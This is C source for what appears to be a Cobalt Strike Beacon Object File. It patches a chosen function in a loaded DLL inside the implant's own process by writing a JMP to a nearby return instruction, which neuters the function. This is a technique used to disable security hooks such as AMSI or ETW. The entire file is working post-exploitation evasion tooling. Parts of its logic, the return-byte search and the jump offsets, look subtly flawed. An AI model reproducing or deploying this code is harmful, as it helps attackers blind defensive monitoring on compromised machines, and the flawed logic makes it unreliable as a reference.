#include <windows.h>
#include "beacon.h"

WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE, LPCSTR);
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess (VOID);
WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap (VOID);
WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc (HANDLE, DWORD, SIZE_T);
WINBASEAPI WINBOOL WINAPI KERNEL32$HeapFree (HANDLE, DWORD, LPVOID);
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR);
WINBASEAPI WINBOOL WINAPI KERNEL32$ReadProcessMemory (HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);

// Define int32_t if not available
typedef long int32_t;

// Function to calculate the length of a null-terminated string
size_t custom_strlen(const char *str) {
    const char *s = str;
    while (*s) ++s;
    return s - str;
}

// Find the nearest C3 instruction in the buffer
int findNearestC3(BYTE *buffer, int size) {
    for (int i = size - 1; i >= 0; i--) {
        if (buffer[i] == 0xC3) {
            return i;
        }
    }
    return -1;
}

// Main BOF function
void go(char *args, int length) {
    char *dllName;
    char *functionName;
    int numOfBytes;
    HMODULE hModule;
    FARPROC functionAddress;
    SIZE_T bytesRead;
    BYTE *buffer;
    int bufferSize;
    int offset;

    // Initialize the data parser
    datap parser;
    BeaconDataParse(&parser, args, length);

    // Extract arguments
    dllName = BeaconDataExtract(&parser, NULL);
    functionName = BeaconDataExtract(&parser, NULL);
    numOfBytes = BeaconDataInt(&parser);

    // Attempt to load the DLL if it's not already loaded
    hModule = KERNEL32$GetModuleHandleA(dllName);
    if (hModule == NULL) {
        hModule = KERNEL32$LoadLibraryA(dllName);
        if (hModule == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to load DLL: %s", dllName);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] DLL %s loaded successfully.", dllName);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] DLL %s already loaded.", dllName);
    }

    // Get function address
    functionAddress = KERNEL32$GetProcAddress(hModule, functionName);
    if (!functionAddress) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get function address for: %s\n", functionName);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Function %s found at: 0x%p\n", functionName, functionAddress);

    // Calculate buffer size (half before, half after)
    bufferSize = numOfBytes * 2; // Read 'numOfBytes' backward and forward

    // Allocate buffer dynamically
    buffer = (BYTE*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, bufferSize);
    if (!buffer) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for buffer.\n");
        return;
    }

    // Read memory around the function address
    HANDLE hProcess = KERNEL32$GetCurrentProcess();
    if (!KERNEL32$ReadProcessMemory(hProcess, (LPVOID)((BYTE*)functionAddress - numOfBytes), buffer, bufferSize, &bytesRead)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to read memory around function.\n");
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buffer);
        return;
    }

    // Find the nearest C3 instruction
    int c3Index = findNearestC3(buffer, bufferSize);
    if (c3Index == -1) {
        BeaconPrintf(CALLBACK_ERROR, "No C3 (return) instruction found.\n");
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buffer);
        return;
    }

    // Calculate the offset for the JMP instruction
    offset = c3Index - numOfBytes; // Adjust offset relative to function address

    // Determine jump instruction
    BYTE jumpOp[5];
    int jumpSize = 5;
    if (offset >= -128 && offset <= 127) { // Short JMP
        jumpOp[0] = 0xEB;
        jumpOp[1] = (BYTE)(offset - 2);
        jumpSize = 2;
    } else { // Near JMP
        jumpOp[0] = 0xE9;
        int32_t jumpOffset = offset - 5;
        memcpy(&jumpOp[1], &jumpOffset, sizeof(int32_t));
    }

    // Write jump instruction
    if (!KERNEL32$WriteProcessMemory(hProcess, (LPVOID)functionAddress, jumpOp, jumpSize, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write jump instruction.\n");
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buffer);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Patch applied successfully!\n");

    // Clean up
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buffer);
}